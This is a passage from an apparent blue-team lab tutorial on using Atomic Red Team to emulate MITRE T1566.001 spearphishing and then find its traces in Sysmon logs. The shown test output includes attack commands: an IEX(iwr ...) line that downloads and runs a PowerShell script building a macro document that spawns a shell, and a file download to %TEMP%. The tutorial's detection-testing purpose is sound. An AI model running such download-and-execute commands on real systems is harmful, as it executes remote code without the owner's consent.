  <li><strong>The line between anomalous and expected behaviour is often very fine and sometimes even has significant overlap.</strong> For example, let’s say we are a company based in the US. We expect to see almost all of our logins come from IP addresses in the US. One day, we get a login event from an IP in the EU, which would be an anomaly. However, it could also be our CEO travelling for business. This is an example where normal and malicious behaviour intertwine, making it hard to create accurate detection rules that would not have too much noise.</li>
</ul>

<p>Blue teams constantly refine and improve their detection rules to close the gaps they experience due to the two reasons mentioned above. Let’s take a look at how this can be done!</p>

<h2 id="cyber-attacks-and-the-kill-chain">Cyber Attacks and the Kill Chain</h2>

<p>Before diving into creating new detection rules, we first have to discuss some key topics. The first topic to discuss is the Cyber Kill chain. All cyber attacks follow a fairly standard process, which is explained quite well by the Unified Cyber Kill chain:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/ddd4bddb2db2285c3e42eef4c35b6211.png" alt="The process flow of the Unified Kill chain." /> \n</p>

<p>As a blue teamer, it would be our dream to prevent all attacks at the start of the kill chain. So even just when threat actors start their reconnaissance, we already stop them dead in their tracks. But, as discussed before, this is not possible. The goal then shifts slightly. If we are unable to fully detect and prevent a threat actor at any one phase in the kill chain, the goal becomes to perform detections across the entire kill chain in such a way that even if there are detection gaps in a single phase, the gap is covered in a later phase. The goal is, therefore, to ensure we can detect the threat actor before the very last phase of goal execution. \n</p>

<h2 id="mitre-attck">MITRE ATT&amp;CK</h2>

<p>A popular framework for understanding the different techniques and tactics that threat actors perform through the kill chain is the <a href="https://attack.mitre.org">MITRE ATT&amp;CK framework</a>. The framework is a collection of tactics, techniques, and procedures that have been seen to be implemented by real threat actors. The framework provides a <a href="https://mitre-attack.github.io/attack-navigator/">navigator tool</a> where these TTPs can be investigated:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730831075861.png" alt="The MITRE ATTACK&amp;CK navigator page." /></p>

<p>However, the framework primarily discusses these TTPs in a theoretical manner. Even if we know we have a gap for a specific TTP, we don’t really know how to test the gap or close it down. This is where the Atomics come in!</p>

<h2 id="atomic-red">Atomic Red</h2>

<p>The Atomic Red Team library is a collection of red team test cases that are mapped to the MITRE ATT&amp;CK framework. The library consists of simple test cases that can be executed by any blue team to test for detection gaps and help close them down. The library also supports automation, where the techniques can be automatically executed. However, it is also possible to execute them manually.</p>

<h2 id="dropping-the-atomic">Dropping the Atomic</h2>

<p>McSkidy has a vague idea of what happened to the “compromised machine.” It seems someone tried to use the Atomic Red Team to emulate an attack on one of our systems without permission. The perpetrator also did not clean up the test artefacts. Let’s have a look at what happened.</p>

<h2 id="running-an-atomic">Running an Atomic</h2>

<p>McSkidy suspects that the supposed attacker used the MITRE ATT&amp;CK technique <a href="https://attack.mitre.org/techniques/T1566/001/">T1566.001 Spearphishing</a> with an attachment. Let’s recreate the attack emulation performed by the supposed attacker and then look for the artefacts created.</p>

<p>Open up a PowerShell prompt as administrator and follow along with us. Let’s start by having a quick peek at the help page. Enter the command <code class="language-plaintext highlighter-rouge">Get-Help Invoke-Atomictest</code>. You should see the output below:</p>

<p>Administrator: Windows PowerShell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">Help</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">Atomictest</span>
<span class="nx">NAME</span>
    <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span>

<span class="nx">SYNTAX</span>
    <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="p">[</span><span class="o">-</span><span class="nx">AtomicTechnique</span><span class="p">]</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">[]</span><span class="o">&gt;</span> <span class="p">[</span><span class="o">-</span><span class="nx">ShowDetails</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">ShowDetailsBrief</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">TestNumbers</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">]</span>
    <span class="p">[</span><span class="o">-</span><span class="nx">TestNames</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">TestGuids</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">PathToAtomicsFolder</span> <span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">CheckPrereqs</span><span class="p">]</span>
    <span class="p">[</span><span class="o">-</span><span class="nx">PromptForInputArgs</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">GetPrereqs</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Cleanup</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">NoExecutionLog</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">ExecutionLogPath</span> <span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Force</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">InputArgs</span><span class="o">&lt;</span><span class="nx">hashtable</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">TimeoutSeconds</span> <span class="o">&lt;</span><span class="nx">int</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Session</span> <span class="o">&lt;</span><span class="nx">PSSession</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Interactive</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">KeepStdOutStdErrFiles</span><span class="p">]</span>
    <span class="p">[</span><span class="o">-</span><span class="nx">LoggingModule</span> <span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">WhatIf</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Confirm</span><span class="p">]</span>  <span class="p">[</span><span class="o">&lt;</span><span class="nx">CommonParameters</span><span class="o">&gt;</span><span class="p">]</span>

<span class="nx">ALIASES</span>
    <span class="nx">None</span>

<span class="nx">REMARKS</span>
    <span class="nx">None</span>
</code></pre></div></div>

<p>The help above only shows what parameters are available without any explanation. Even though most parameter names are self-explanatory, let us have a quick overview of the parameters we will use in this walkthrough:</p>

<table>
  <thead>
    <tr>
      <th>Parameter</th>
      <th>Explanation</th>
      <th>Example use</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-Atomic Technique</code></td>
      <td>This defines what technique you want to emulate. You can use the complete technique name or the “TXXXX” value. This flag can be omitted. \n</td>
      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest -AtomicTechnique T1566.001</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-ShowDetails</code></td>
      <td>Shows the details of each test included in the Atomic.</td>
      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -ShowDetails</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-ShowDetailsBrief</code></td>
      <td>Shows the title of each test included in the Atomic.</td>
      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -ShowDetailsBrief</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-CheckPrereqs</code></td>
      <td>Provides a check if all necessary components are present for testing</td>
      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -CheckPrereqs</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-TestNames</code></td>
      <td>Sets the tests you want to execute using the complete Atomic Test Name.</td>
      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNames "Download Macro-Enabled Phishing Attachment"</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-TestGuids</code></td>
      <td>Sets the tests you want to execute using the unique test identifier.</td>
      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestGuids 114ccff9-ae6d-4547-9ead-4cd69f687306</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-TestNumbers</code></td>
      <td>Sets the tests you want to execute using the test number. The scope is limited to the Atomic Technique.</td>
      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 2,3</code> \n</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-Cleanup</code></td>
      <td>Run the cleanup commands that were configured to revert your machine state to normal.</td>
      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 2 -Cleanup</code></td>
    </tr>
  </tbody>
</table>

<p><strong>Our First Command</strong> \n We can build our first command now that we know which parameters are available. We would like to know more about what exactly happens when we test the Technique T1566.001. To get this information, we must include the name of the technique we want information about and then add the flag<code class="language-plaintext highlighter-rouge">-ShowDetails</code> to our command. Let’s have a look at the command we constructed: <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -ShowDetails</code>. This command displays the details of all tests included in the T1566.001 Atomic.</p>

<p>Atomic Test T1566.001 Details</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">ShowDetails</span>
<span class="nx">PathToAtomicsFolder</span> <span class="o">=</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">AtomicRedTeam</span><span class="err">\</span><span class="nx">atomics</span>

<span class="p">[</span><span class="o">********</span><span class="nx">BEGIN</span> <span class="nx">TEST</span><span class="o">*******</span><span class="p">]</span>
<span class="nx">Technique</span><span class="p">:</span> <span class="nx">Phishing</span><span class="p">:</span> <span class="nx">Spearphishing</span> <span class="nx">Attachment</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span>
<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nx">Name</span><span class="p">:</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>
<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nb">Number</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nx">GUID</span><span class="p">:</span> <span class="mi">114</span><span class="nx">ccff9</span><span class="o">-</span><span class="nx">ae6d</span><span class="o">-</span><span class="mi">4547</span><span class="o">-</span><span class="mi">9</span><span class="nx">ead</span><span class="o">-</span><span class="mi">4</span><span class="nx">cd69f687306</span>
<span class="nx">Description</span><span class="p">:</span> <span class="nx">This</span> <span class="nx">atomic</span> <span class="nx">test</span> <span class="nx">downloads</span> <span class="nx">a</span> <span class="nx">macro</span> <span class="nx">enabled</span> <span class="nb">document</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">Atomic</span> <span class="nx">Red</span> <span class="nx">Team</span> <span class="nx">GitHub</span> <span class="nx">repository</span><span class="p">,</span> <span class="nx">simulating</span>
<span class="nx">an</span> <span class="nx">end</span> <span class="nx">user</span> <span class="nx">clicking</span> <span class="nx">a</span> <span class="nx">phishing</span> <span class="nx">link</span> <span class="nx">to</span> <span class="nx">download</span> <span class="nx">the</span> <span class="nx">file</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">file</span> <span class="dl">"</span><span class="s2">PhishingAttachment.xlsm</span><span class="dl">"</span> <span class="nx">is</span> <span class="nx">downloaded</span> <span class="nx">to</span> <span class="nx">the</span> <span class="o">%</span><span class="nx">temp</span>
<span class="o">%</span> <span class="nx">directory</span><span class="p">.</span>

<span class="nx">Attack</span> <span class="nx">Commands</span><span class="p">:</span>
<span class="nx">Executor</span><span class="p">:</span> <span class="nx">powershell</span>
<span class="nx">ElevationRequired</span><span class="p">:</span> <span class="nx">False</span>
<span class="nx">Command</span><span class="p">:</span>
<span class="nx">$url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://localhost/PhishingAttachment.xlsm</span><span class="dl">'</span>
<span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span> <span class="o">-</span><span class="nx">Uri</span> <span class="nx">$url</span> <span class="o">-</span><span class="nx">OutFile</span> <span class="nx">$env</span><span class="p">:</span><span class="nx">TEMP</span><span class="err">\</span><span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span>

<span class="nx">Cleanup</span> <span class="nx">Commands</span><span class="p">:</span>
<span class="nx">Command</span><span class="p">:</span>
<span class="nx">Remove</span><span class="o">-</span><span class="nx">Item</span> <span class="nx">$env</span><span class="p">:</span><span class="nx">TEMP</span><span class="err">\</span><span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span> <span class="o">-</span><span class="nx">ErrorAction</span> <span class="nx">Ignore</span>
<span class="p">[</span><span class="o">!!!!!!!!</span><span class="nx">END</span> <span class="nx">TEST</span><span class="o">!!!!!!!</span><span class="p">]</span>


<span class="p">[</span><span class="o">********</span><span class="nx">BEGIN</span> <span class="nx">TEST</span><span class="o">*******</span><span class="p">]</span>
<span class="nx">Technique</span><span class="p">:</span> <span class="nx">Phishing</span><span class="p">:</span> <span class="nx">Spearphishing</span> <span class="nx">Attachment</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span>
<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nx">Name</span><span class="p">:</span> <span class="nx">Word</span> <span class="nx">spawned</span> <span class="nx">a</span> <span class="nx">command</span> <span class="nx">shell</span> <span class="nx">and</span> <span class="nx">used</span> <span class="nx">an</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">command</span> <span class="nx">line</span>
<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nb">Number</span><span class="p">:</span> <span class="mi">2</span>
<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nx">GUID</span><span class="p">:</span> <span class="nx">cbb6799a</span><span class="o">-</span><span class="mi">425</span><span class="nx">c</span><span class="o">-</span><span class="mi">4</span><span class="nx">f83</span><span class="o">-</span><span class="mi">9194</span><span class="o">-</span><span class="mi">5447</span><span class="nx">a909d67f</span>
<span class="nx">Description</span><span class="p">:</span> <span class="nx">Word</span> <span class="nx">spawning</span> <span class="nx">a</span> <span class="nx">command</span> <span class="nx">prompt</span> <span class="nx">then</span> <span class="nx">running</span> <span class="nx">a</span> <span class="nx">command</span> <span class="kd">with</span> <span class="nx">an</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">command</span> <span class="nx">line</span> <span class="nx">is</span> <span class="nx">an</span> <span class="nx">indiciat</span>
<span class="nx">or</span> <span class="k">of</span> <span class="nx">malicious</span> <span class="nx">activity</span><span class="p">.</span> <span class="nx">Upon</span> <span class="nx">execution</span><span class="p">,</span> <span class="nx">CMD</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">lauchned</span> <span class="nx">and</span> <span class="nx">ping</span> <span class="mf">8.8</span><span class="p">.</span><span class="mf">8.8</span>

<span class="nx">Attack</span> <span class="nx">Commands</span><span class="p">:</span>
<span class="nx">Executor</span><span class="p">:</span> <span class="nx">powershell</span>
<span class="nx">ElevationRequired</span><span class="p">:</span> <span class="nx">False</span>
<span class="nx">Command</span><span class="p">:</span>
<span class="p">[</span><span class="nx">Net</span><span class="p">.</span><span class="nx">ServicePointManager</span><span class="p">]::</span><span class="nx">SecurityProtocol</span> <span class="o">=</span> <span class="p">[</span><span class="nx">Net</span><span class="p">.</span><span class="nx">SecurityProtocolType</span><span class="p">]::</span><span class="nx">Tls12</span>
<span class="nc">IEX </span><span class="p">(</span><span class="nx">iwr</span> <span class="dl">"</span><span class="s2">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1</span><span class="dl">"</span> <span class="o">-</span><span class="nx">UseBasicParsing</span><span class="p">)</span>
<span class="nx">$macrocode</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">   Open `</span><span class="dl">"</span><span class="err">#</span><span class="p">{</span><span class="nx">jse_path</span><span class="p">}</span><span class="s2">`" For Output As #1`</span><span class="nx">n</span>   <span class="nx">Write</span> <span class="err">#</span><span class="mi">1</span><span class="p">,</span> <span class="s2">`"WScript.Quit`</span><span class="dl">"</span><span class="s2">`n   Close #1`n   Shell`$ `</span><span class="dl">"</span><span class="nx">ping</span> <span class="mf">8.8</span><span class="p">.</span><span class="mf">8.8</span><span class="s2">`"`</span><span class="nx">n</span><span class="dl">"</span><span class="s2">
Invoke-MalDoc -macroCode $macrocode -officeProduct </span><span class="dl">"</span><span class="err">#</span><span class="p">{</span><span class="nx">ms_product</span><span class="p">}</span><span class="dl">"</span><span class="s2">
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr </span><span class="dl">"</span><span class="nx">https</span><span class="p">:</span><span class="c1">//raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)</span>
<span class="nx">$macrocode</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">   Open `</span><span class="dl">"</span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Public</span><span class="err">\</span><span class="nx">art</span><span class="p">.</span><span class="nx">jse</span><span class="s2">`" For Output As #1`</span><span class="nx">n</span>   <span class="nx">Write</span> <span class="err">#</span><span class="mi">1</span><span class="p">,</span> <span class="s2">`"WScript.Quit`</span><span class="dl">"</span><span class="s2">`n   Close #1`n   Shell`$ `</span><span class="dl">"</span><span class="nx">ping</span> <span class="mf">8.8</span><span class="p">.</span><span class="mf">8.8</span><span class="s2">`"`</span><span class="nx">n</span><span class="dl">"</span><span class="s2">
Invoke-MalDoc -macroCode $macrocode -officeProduct </span><span class="dl">"</span><span class="nx">Word</span><span class="dl">"</span><span class="s2">

Cleanup Commands:
Command:
Remove-Item #{jse_path} -ErrorAction Ignore
Command (with inputs):
Remove-Item C:</span><span class="se">\</span><span class="s2">Users</span><span class="se">\</span><span class="s2">Public</span><span class="se">\</span><span class="s2">art.jse -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject </span><span class="dl">"</span><span class="err">#</span><span class="p">{</span><span class="nx">ms_product</span><span class="p">}.</span><span class="nx">Application</span><span class="dl">"</span><span class="s2"> | Out-Null
  $process = </span><span class="dl">"</span><span class="err">#</span><span class="p">{</span><span class="nx">ms_product</span><span class="p">}</span><span class="dl">"</span><span class="s2">; if ( $process -eq </span><span class="dl">"</span><span class="nx">Word</span><span class="dl">"</span><span class="s2">) {$process = </span><span class="dl">"</span><span class="nx">winword</span><span class="dl">"</span><span class="s2">}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Check Prereq Command (with inputs):
try {
  New-Object -COMObject </span><span class="dl">"</span><span class="nx">Word</span><span class="p">.</span><span class="nx">Application</span><span class="dl">"</span><span class="s2"> | Out-Null
  $process = </span><span class="dl">"</span><span class="nx">Word</span><span class="dl">"</span><span class="s2">; if ( $process -eq </span><span class="dl">"</span><span class="nx">Word</span><span class="dl">"</span><span class="s2">) {$process = </span><span class="dl">"</span><span class="nx">winword</span><span class="dl">"</span><span class="s2">}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host </span><span class="dl">"</span><span class="nx">You</span> <span class="nx">will</span> <span class="nx">need</span> <span class="nx">to</span> <span class="nx">install</span> <span class="nx">Microsoft</span> <span class="err">#</span><span class="p">{</span><span class="nx">ms_product</span><span class="p">}</span> <span class="nx">manually</span> <span class="nx">to</span> <span class="nx">meet</span> <span class="k">this</span> <span class="nx">requirement</span><span class="dl">"</span><span class="s2">
Get Prereq Command (with inputs):
Write-Host </span><span class="dl">"</span><span class="nx">You</span> <span class="nx">will</span> <span class="nx">need</span> <span class="nx">to</span> <span class="nx">install</span> <span class="nx">Microsoft</span> <span class="nx">Word</span> <span class="nx">manually</span> <span class="nx">to</span> <span class="nx">meet</span> <span class="k">this</span> <span class="nx">requirement</span><span class="dl">"</span><span class="s2">
[!!!!!!!!END TEST!!!!!!!]

</span></code></pre></div></div>

<p>The output above is clearly split up into multiple parts, each matching a test. Let’s examine what type of information is provided in a test. We will use the test we want to run as an example.</p>

<table>
  <thead>
    <tr>
      <th>Key</th>
      <th>Value</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Technique</td>
      <td>Phishing: Spearphishing Attachment T1566.001</td>
      <td>The full name of the MITRE ATT&amp;CK technique that will be tested</td>
    </tr>
    <tr>
      <td>Atomic Test Name</td>
      <td>Download Macro-Enabled Phishing Attachment</td>
      <td>A descriptive name of the type of test that will be executed</td>
    </tr>
    <tr>
      <td>Atomic Test Number</td>
      <td>1</td>
      <td>A number is assigned to the test; we can use this in the command to specify which test we want to run.</td>
    </tr>
    <tr>
      <td>Atomic Test GUID</td>
      <td>114ccff9-ae6d-4547-9ead-4cd69f687306</td>
      <td>A unique ID is assigned to this test; we can use this in the command to specify which test we want to run.</td>
    </tr>
    <tr>
      <td>Description</td>
      <td>This atomic test downloads a macro-enabled document from the Atomic Red Team GitHub repository, simulating an end-user clicking a phishing link to download the file. The file “PhishingAttachment.xlsm” is downloaded to the %temp% directory.</td>
      <td>Provides a detailed explanation of what the test will do.</td>
    </tr>
    <tr>
      <td>Attack commands</td>
      <td><strong>Executor:</strong> powershell<strong>ElevationRequired:</strong> False<strong>Command:</strong> $url = ‘http://localhost/PhishingAttachment.xlsm’ Invoke-WebRequest -Uri $url -OutFile $env:TEMP.xlsm</td>
      <td>This provides an overview of all the commands run during the test, including the executor of those commands and the required privileges. It also helps us determine where to look for artefacts in Windows Event Viewer.</td>
    </tr>
    <tr>
      <td>Cleanup commands</td>
      <td>Command: Remove-Item $env:TEMP.xlsm -ErrorAction Ignore</td>
      <td>An overview of the commands executed to revert the machine back to its original state.</td>
    </tr>
    <tr>
      <td>Dependencies</td>
      <td>There are no dependencies required. \n</td>
      <td>An overview of all required resources that must be present on the testing machine in order to execute the test</td>
    </tr>
  </tbody>
</table>

<p><strong>Phishing: Spearphishing Attachment T1566.001 Emulated</strong></p>

<p>Let’s continue and run the first test of T1566.001. Before running the emulation, we should ensure that all required resources are in place to conduct it successfully. To verify this, we can add the flag <code class="language-plaintext highlighter-rouge">-Checkprereq</code> to our command. The command should look something like this: <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 1 -CheckPrereq</code>.</p>

<p>This command will use the data included in the “dependencies” part of the test details to verify if all required resources are present. Looking at the test 1 dependencies of the T1566.001 Atomic, no additional resources are required. Run the same command for test 2, and it will state that Microsoft Word needs to be installed, as shown below:</p>

<p>Administrator: Windows PowerShell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">TestNumbers</span> <span class="mi">2</span> <span class="o">-</span><span class="nx">CheckPrereq</span>
<span class="nx">PathToAtomicsFolder</span> <span class="o">=</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">AtomicRedTeam</span><span class="err">\</span><span class="nx">atomics</span>

<span class="nx">CheckPrereq</span><span class="dl">'</span><span class="s1">s for: T1566.001-2 Word spawned a command shell and used an IP address in the command line
Prerequisites not met: T1566.001-2 Word spawned a command shell and used an IP address in the command line
[*] Microsoft Word must be installed

Try installing prereq</span><span class="dl">'</span><span class="nx">s</span> <span class="kd">with</span> <span class="nx">the</span> <span class="o">-</span><span class="nx">GetPrereqs</span> <span class="k">switch</span>

</code></pre></div></div>

<p>Now that we have verified the dependencies, let us continue with the emulation. Execute the following command to start the emulation: <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 1</code> and you should get the following output:</p>

<p>Executing Atomic Test T1566.001</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">TestNumbers</span> <span class="mi">1</span>
<span class="nx">PathToAtomicsFolder</span> <span class="o">=</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">AtomicRedTeam</span><span class="err">\</span><span class="nx">atomics</span>

<span class="nx">Executing</span> <span class="nx">test</span><span class="p">:</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span><span class="o">-</span><span class="mi">1</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>
<span class="nx">Done</span> <span class="nx">executing</span> <span class="nx">test</span><span class="p">:</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span><span class="o">-</span><span class="mi">1</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>

</code></pre></div></div>

<p>Based on the output, we can determine that the test was successfully executed. We can now analyse the logs in theWindows Event Viewer to find Indicators of Attack and Compromise.</p>

<h2 id="detecting-the-atomic">Detecting the Atomic</h2>

<p>Now that we have executed the T1566.001 Atomic, we can look for log entries that point us to this emulated attack. For this purpose, we will use the Windows Event Logs. This machine comes with <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> installed. System Monitor (Sysmon) provides us with detailed information about process creation, network connections, and changes to file creation time.</p>

<p>To make it easier for us to pick up the events created for this emulation, we will first start with cleaning up files from the previous test by running the command <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 1 -cleanup</code>.</p>

<p>Administrator: Windows PowerShell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="nx">cleanup</span>
</code></pre></div></div>

<p>Now, we will clear the Sysmon event log:</p>

<ul>
  <li>Open up Event Viewer by clicking the icon in the taskbar, or searching for it in the Start Menu.</li>
  <li>Navigate to <code class="language-plaintext highlighter-rouge">Applications and Services =&gt; Microsoft =&gt; Windows =&gt; Sysmon =&gt; Operational</code> on the left-hand side of the screen.</li>
  <li>Right-click <code class="language-plaintext highlighter-rouge">Operational</code> on the left-hand side of the screen and click <strong>Clear Log</strong>. Click <strong>Clear</strong> when the popup shows.</li>
</ul>

<p>Now that we have cleaned up the files and the sysmon logs, let us run the emulation again by issuing the command <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 1</code>.</p>

<p>Administrator: Windows PowerShell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">TestNumbers</span> <span class="mi">1</span>
<span class="nx">PathToAtomicsFolder</span> <span class="o">=</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">AtomicRedTeam</span><span class="err">\</span><span class="nx">atomics</span>

<span class="nx">Executing</span> <span class="nx">test</span><span class="p">:</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span><span class="o">-</span><span class="mi">1</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>
